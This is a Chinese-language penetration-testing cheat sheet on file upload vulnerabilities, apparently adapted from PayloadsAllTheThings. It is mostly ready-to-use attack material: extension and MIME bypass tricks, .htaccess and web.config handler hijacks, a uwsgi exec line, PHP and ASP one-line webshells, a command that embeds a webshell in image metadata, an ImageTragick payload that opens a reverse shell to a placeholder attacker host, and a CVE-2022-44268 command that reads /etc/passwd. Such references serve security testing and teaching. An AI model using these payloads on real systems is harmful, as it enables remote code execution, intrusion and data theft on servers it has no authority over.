# File Upload - 文件上传漏洞

[SEARCH_KEYWORDS]
漏洞类型: File Upload Arbitrary File Upload Unrestricted File Upload 文件上传
攻击类型: RCE Remote Code Execution Webshell XSS XXE SSRF
关键词: upload multipart/form-data webshell extension MIME type magic bytes
扩展名: php phtml phar aspx jsp jspx
绕过技术: Double Extension Null Byte Content-Type Magic Bytes .htaccess web.config

[CONTENT]

## 文件上传漏洞概述

文件上传如果处理不当可能带来重大风险。攻击者可能发送带有特殊构造的文件名或MIME类型的multipart/form-data POST请求，执行任意代码。

## 默认扩展名

### PHP

```
.php .php3 .php4 .php5 .php7
.pht .phps .phar .phpt .pgif .phtml .phtm .inc
```

### ASP

```
.asp .aspx .config .cer .asa
shell.aspx;1.jpg  # IIS < 7.0
shell.soap
```

### JSP

```
.jsp .jspx .jsw .jsv .jspf .wss .do .actions
```

## 上传绕过技巧

### 扩展名绕过

```powershell
# 双扩展名
file.php.jpg
file.jpg.php

# 大小写混合
file.pHp
file.PhP5

# NULL字节
file.php%00.jpg
file.php\x00.gif

# 特殊字符
file.php......    # Windows末尾点被移除
file.php%20
file.php%0d%0a.jpg
name.%E2%80%AEphp.jpg  # RTLO绕过
file.php/
file.j\sp
```

### MIME类型绕过

```http
Content-Type: image/gif
Content-Type: image/png
Content-Type: image/jpeg
```

### Magic Bytes

```
PNG: \x89PNG\r\n\x1a\n
JPG: \xff\xd8\xff
GIF: GIF87a 或 GIF8;
```

### 配置文件利用

#### .htaccess (Apache)

```
AddType application/x-httpd-php .rce
AddType application/x-httpd-php .jpg
```

#### web.config (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="%windir%\Microsoft.NET\Framework\v4.0.30319\aspnet_isapi.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness32" />
      </handlers>
   </system.webServer>
</configuration>
```

#### uwsgi.ini

```ini
[uwsgi]
body = @(exec://whoami)
```

## 图片隐藏Payload

### 图片马

```php
GIF89a<?php system($_GET['cmd']); ?>
```

### 元数据注入

```bash
exiftool -Comment="<?php system($_POST['cmd']); ?>" img.jpg
```

### 图片压缩绕过

将PHP代码注入到图片压缩算法中，绕过getimagesize()检测。

## ImageMagick利用

### CVE-2016-3714 (ImageTragik)

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker/port 0>&1|touch "hello)'
pop graphic-context
```

### CVE-2022-44268

```bash
pngcrush -text a "profile" "/etc/passwd" exploit.png
```

## 危险文件类型

| 扩展名 | 漏洞类型 |
|--------|----------|
| .svg | XXE, XSS, SSRF |
| .gif | XSS |
| .csv | CSV Injection |
| .xml | XXE |
| .zip | RCE, LFI |
| .html | XSS, Open Redirect |

## Webshell示例

### PHP

```php
<?php system($_GET['cmd']); ?>
<?=`$_GET[0]`?>
<script language="php">system("id");</script>
```

### ASP

```asp
<% eval request("cmd") %>
```

## 工具

- fuxploider - 文件上传漏洞扫描
- Burp Upload Scanner - Burp文件上传扫描插件
- ZAP FileUpload - OWASP ZAP文件上传插件

## 参考文档

原始来源: PayloadsAllTheThings/Upload Insecure Files/README.md